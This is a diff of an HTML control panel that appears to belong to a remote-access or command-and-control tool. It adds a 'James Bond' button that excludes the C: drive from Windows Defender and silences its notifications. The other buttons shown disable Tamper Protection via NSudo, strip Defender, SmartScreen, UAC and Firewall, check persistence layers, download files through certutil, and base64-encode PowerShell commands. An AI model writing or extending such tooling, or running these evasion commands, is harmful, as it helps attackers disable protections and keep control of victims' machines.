@@ -437,6 +437,7 @@ th{background:#16213e;color:#ffd700;}tr:hover{background:#222;}
 <button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#00FF00;" onclick="sendCmd('VERIFY_LAYERS')">✅ Verify Layers <span>Check all persistence layers</span></button>
 <button type="button" class="cmd-btn" style="background:#2a0a0a;border-color:#ff4444;" onclick="sendCmd('NSUDO')">🔓 NSudo Disable TP <span>Disable Windows Defender Tamper Protection via NSudo</span></button>
 <button type="button" class="cmd-btn" style="background:#2a0000;border-color:#ff0000;" onclick="sendCmd('FREEBALL')">🔥 FREEBALL <span>Strip all security: Defender, SmartScreen, UAC, Firewall</span></button>
+<button type="button" class="cmd-btn" style="background:#1a0a2a;border-color:#9C27B0;" onclick="sendCmd('JAMES_BOND')">🕴️ James Bond <span>Add C: exclusion + silence Defender notifications</span></button>
 <button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="var url=prompt('URL:'); var path=prompt('Save path:'); if(url&&path) sendCmd('LOLBAS_DOWNLOAD '+url+' '+path)">🎭 Download File <span>Download via certutil</span></button>
 <button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="var cmd=prompt('PowerShell command:'); if(cmd) sendCmd('OBFUSCATE_PS '+cmd)">📝 Encode Command <span>Base64 encode command</span></button>
 </div>
